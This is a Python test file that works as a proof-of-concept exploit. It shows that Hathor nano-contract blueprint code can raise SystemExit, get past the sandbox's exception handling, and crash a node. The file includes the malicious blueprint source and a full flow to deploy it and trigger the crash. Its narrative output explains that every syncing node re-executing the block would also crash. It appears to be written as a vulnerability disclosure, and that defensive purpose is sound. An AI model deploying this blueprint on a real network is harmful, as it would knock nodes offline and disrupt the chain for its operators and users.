"""
PoC: SystemExit sandbox escape in Hathor nano contracts.
Run with: python -m pytest hathor_tests/nanocontracts/test_systemexit_escape.py -s -o "addopts="
The -s flag prints the narrative output.
"""

from io import StringIO
from textwrap import dedent
from unittest.mock import Mock

from hathor.conf import HathorSettings
from hathor.execution_manager import ExecutionManager
from hathor.nanocontracts import Blueprint, Context, public
from hathor.nanocontracts.catalog import NCBlueprintCatalog
from hathor.nanocontracts.custom_builtins import EXEC_BUILTINS, DISABLED_BUILTINS
from hathor.nanocontracts.exception import NCFail
from hathor.nanocontracts.method import Method
from hathor.nanocontracts.nc_types import make_nc_type_for_arg_type as make_nc_type
from hathor.nanocontracts.types import TokenUid
from hathor.nanocontracts.utils import sign_pycoin
from hathor.simulator.trigger import StopAfterMinimumBalance, StopAfterNMinedBlocks
from hathor.transaction import Transaction
from hathor.transaction.headers import NanoHeader
from hathor_tests.nanocontracts.blueprints.unittest import BlueprintTestCase
from hathor_tests.simulation.base import SimulatorTestCase

settings = HathorSettings()
TOKEN_NC_TYPE = make_nc_type(TokenUid)


class CrashBlueprint(Blueprint):
    token_uid: TokenUid

    @public
    def initialize(self, ctx: Context, token_uid: TokenUid) -> None:
        self.token_uid = token_uid

    @public
    def crash_node(self, ctx: Context) -> None:
        raise SystemExit()


MALICIOUS_BLUEPRINT_SRC = dedent('''
    from hathor import Blueprint, Context, export, public

    @export
    class CrashBlueprint(Blueprint):
        flag: int

        @public
        def initialize(self, ctx: Context) -> None:
            self.flag = 0

        @public
        def crash_node(self, ctx: Context) -> None:
            raise SystemExit()
''')


class TestSystemExitEscape(SimulatorTestCase):
    """Single flowing PoC that demonstrates the full attack."""
    __test__ = True

    def setUp(self):
        super().setUp()
        self.crash_blueprint_id = b'crash_bp' + b'\x00' * 24
        self.catalog = NCBlueprintCatalog({
            self.crash_blueprint_id: CrashBlueprint,
        })
        self.nc_seqnum = 0
        self.manager = self.simulator.create_peer()
        self.manager.allow_mining_without_peers()
        self.manager.tx_storage.nc_catalog = self.catalog
        self.wallet = self.manager.wallet
        self.miner = self.simulator.create_miner(self.manager, hashpower=100e6)
        self.miner.start()
        self.token_uid = TokenUid(b'\0')
        trigger = StopAfterMinimumBalance(self.wallet, self.token_uid, 1)
        self.assertTrue(self.simulator.run(7200, trigger=trigger))

    def _gen_nc_tx(self, nc_id, nc_method, nc_args):
        method_parser = Method.from_callable(getattr(CrashBlueprint, nc_method))
        nc = Transaction(timestamp=int(self.manager.reactor.seconds()))
        nc_args_bytes = method_parser.serialize_args_bytes(nc_args)
        address = self.wallet.get_unused_address()
        privkey = self.wallet.get_private_key(address)
        nano_header = NanoHeader(
            tx=nc, nc_seqnum=self.nc_seqnum, nc_id=nc_id,
            nc_method=nc_method, nc_args_bytes=nc_args_bytes,
            nc_address=b'', nc_script=b'', nc_actions=[],
        )
        nc.headers.append(nano_header)
        self.nc_seqnum += 1
        sign_pycoin(nano_header, privkey)
        nc.timestamp = int(self.manager.get_timestamp_for_new_vertex())
        nc.parents = self.manager.get_new_tx_parents(nc.timestamp)
        nc.weight = self.manager.daa.minimum_tx_weight(nc)
        return nc

    def test_full_attack(self):
        print("\n")
        print("=" * 60)
        print("PoC: SystemExit sandbox escape")
        print("=" * 60)

        # -- check the builtins --
        print("\nFirst I checked whether SystemExit is available to blueprint")
        print("code. It's in EXEC_BUILTINS (custom_builtins.py:800) and NOT")
        print("in DISABLED_BUILTINS:")
        print()
        print(f"  'SystemExit' in EXEC_BUILTINS:     {('SystemExit' in EXEC_BUILTINS)}")
        print(f"  'SystemExit' in DISABLED_BUILTINS:  {('SystemExit' in DISABLED_BUILTINS)}")
        print(f"  'exit' in DISABLED_BUILTINS:        {('exit' in DISABLED_BUILTINS)}")
        print()
        print("They blocked exit() but not SystemExit itself. Same for the")
        print("other BaseException subclasses:")
        for name in ('BaseException', 'KeyboardInterrupt', 'GeneratorExit'):
            print(f"  '{name}' in EXEC_BUILTINS: {(name in EXEC_BUILTINS)}, "
                  f"in DISABLED_BUILTINS: {(name in DISABLED_BUILTINS)}")

        assert 'SystemExit' in EXEC_BUILTINS
        assert 'SystemExit' not in DISABLED_BUILTINS

        # -- deploy the contract --
        print()
        print("Next I deployed a blueprint with a crash_node() method that")
        print("just does `raise SystemExit()`. Sent the initialize() tx and")
        print("mined 2 blocks to confirm it:")
        print()

        nc_tx = self._gen_nc_tx(self.crash_blueprint_id, 'initialize', [self.token_uid])
        self.manager.cpu_mining_service.resolve(nc_tx)
        self.manager.on_new_tx(nc_tx)
        nc_id = nc_tx.hash

        trigger = StopAfterNMinedBlocks(self.miner, quantity=2)
        self.assertTrue(self.simulator.run(14400, trigger=trigger))

        nc_storage = self.manager.get_best_block_nc_storage(nc_id)
        stored_token = nc_storage.get_obj(b'token_uid', TOKEN_NC_TYPE)
        self.assertEqual(stored_token, self.token_uid)

        print(f"  contract nc_id: {nc_id.hex()}")
        print(f"  token_uid stored in contract: {stored_token.hex()}")
        print(f"  voided_by: {nc_tx.get_metadata().voided_by}")
        print("  Contract deployed and confirmed.")

        # -- send the malicious tx --
        self.miner.stop()
        self.manager.reactor.advance(10)
        crash_tx = self._gen_nc_tx(nc_id, 'crash_node', [])
        self.manager.cpu_mining_service.resolve(crash_tx)
        self.manager.on_new_tx(crash_tx)
        self.assertIsNone(crash_tx.get_metadata().voided_by)

        print()
        print("Then I sent a transaction calling crash_node():")
        print()
        print(f"  crash tx hash: {crash_tx.hash.hex()}")
        print(f"  voided_by: {crash_tx.get_metadata().voided_by}")
        print("  Transaction accepted into mempool.")

        # -- mock crash_and_exit and mine the block --
        #
        # I have to mock crash_and_exit because it calls sys.exit(-1)
        # which would kill the test process. But everything BEFORE
        # crash_and_exit runs for real -- the metadata write at
        # vertex_handler.py:180-182 (add_voided_by + save_transaction)
        # happens before crash_and_exit is called at line 183. So the
        # mock only affects what happens AFTER the metadata is already
        # written. In production sys.exit(-1) kills the process at that
        # point. In the test the function just returns.
        execution_manager_mock = Mock(spec_set=ExecutionManager)
        self.manager.vertex_handler._execution_manager = execution_manager_mock

        self.manager.reactor.advance(1)
        block = self.manager.generate_mining_block()
        self.manager.cpu_mining_service.resolve(block)
        self.manager.propagate_tx(block)

        print()
        print("Mined a block that includes the crash_node() transaction.")
        print("vertex_handler processes the block, NC execution runs the")
        print("blueprint code, SystemExit escapes the sandbox:")
        print()

        crash_called = execution_manager_mock.crash_and_exit.called
        call_args = execution_manager_mock.crash_and_exit.call_args
        reason = call_args.kwargs.get('reason', '') if call_args else ''
        print(f"  crash_and_exit called: {crash_called}")
        print(f"  reason: \"{reason}\"")

        assert crash_called
        assert 'on_new_vertex() failed' in reason

        # -- check DAG persistence --
        block_persisted = self.manager.tx_storage.transaction_exists(block.hash)
        tx_persisted = self.manager.tx_storage.transaction_exists(crash_tx.hash)

        block_from_storage = self.manager.tx_storage.get_transaction(block.hash)
        block_meta = block_from_storage.get_metadata()
        voided = block_meta.voided_by or set()
        has_fail_id = self._settings.CONSENSUS_FAIL_ID in voided

        print()
        print("Now I checked whether the block and transaction are still in")
        print("RocksDB after the crash. _unsafe_save_and_run_consensus saves")
        print("the block at vertex_handler.py:229 BEFORE unsafe_update runs")
        print("NC execution at line 232. So the block is persisted before")
        print("SystemExit is even raised:")
        print()
        print(f"  block in storage:    {block_persisted}  (hash: {block.hash.hex()[:16]}...)")
        print(f"  crash tx in storage: {tx_persisted}  (hash: {crash_tx.hash.hex()[:16]}...)")
        print(f"  block voided_by:     {voided}")
        print(f"  has CONSENSUS_FAIL_ID: {has_fail_id}")

        assert block_persisted
        assert tx_persisted
        assert has_fail_id

        print()
        print("The CONSENSUS_FAIL_ID metadata is written at vertex_handler.py")
        print("lines 180-182, which execute before crash_and_exit at line 183.")
        print("The mock only replaces crash_and_exit itself (which would call")
        print("sys.exit(-1) in production). Everything before it -- the")
        print("metadata write and the save_transaction call -- runs the real")
        print("code. So this metadata state is exactly what a restarting node")
        print("would see.")

        print()
        print("Any node syncing this chain receives the same block, processes")
        print("it through vertex_handler, re-executes the NC code, and hits")
        print("the same SystemExit -> crash_and_exit path.")
        print()
        print("=" * 60)
        print("Done.")
        print("=" * 60)


class TestSandboxEscapeControl(BlueprintTestCase):
    """Shows the gap: SystemExit escapes but ValueError is caught."""

    def test_sandbox_escape_vs_normal_exception(self):
        print("\n")
        print("=" * 60)
        print("Control: sandbox escape vs normal exception")
        print("=" * 60)

        # register the malicious blueprint through the real NC pipeline
        contract_id = self.gen_random_contract_id()
        blueprint_id = self._register_blueprint_contents(StringIO(MALICIOUS_BLUEPRINT_SRC))
        self.runner.create_contract(contract_id, blueprint_id, self.create_context())

        print()
        print("Registered a blueprint with `raise SystemExit()` through the")
        print("real NC pipeline (BlueprintTestCase, HathorManager, RocksDB).")
        print("Called crash_node() via Runner.call_public_method():")
        print()

        escaped = False
        try:
            self.runner.call_public_method(
                contract_id, 'crash_node', self.create_context()
            )
        except SystemExit:
            escaped = True

        print(f"  SystemExit escaped the sandbox: {escaped}")
        assert escaped

        # now try the same with a normal ValueError
        safe_src = dedent('''
            from hathor import Blueprint, Context, export, public

            @export
            class SafeBlueprint(Blueprint):
                @public
                def initialize(self, ctx: Context) -> None:
                    pass

                @public
                def raise_error(self, ctx: Context) -> None:
                    raise ValueError("this should be caught")
        ''')

        contract_id2 = self.gen_random_contract_id()
        blueprint_id2 = self._register_blueprint_contents(StringIO(safe_src))
        self.runner.create_contract(contract_id2, blueprint_id2, self.create_context())

        print()
        print("For comparison, registered a blueprint with `raise ValueError()`.")
        print("Called raise_error() via the same Runner.call_public_method():")
        print()

        caught_as_ncfail = False
        try:
            self.runner.call_public_method(
                contract_id2, 'raise_error', self.create_context()
            )
        except NCFail:
            caught_as_ncfail = True
        except Exception:
            pass

        print(f"  ValueError caught as NCFail: {caught_as_ncfail}")
        assert caught_as_ncfail

        print()
        print("metered_exec.py:107 catches `except Exception` and wraps it as")
        print("NCFail. That works for ValueError because ValueError inherits")
        print("from Exception. But SystemExit inherits from BaseException, not")
        print("Exception, so it slips past.")
        print()
        print("=" * 60)
        print("Done.")
        print("=" * 60)
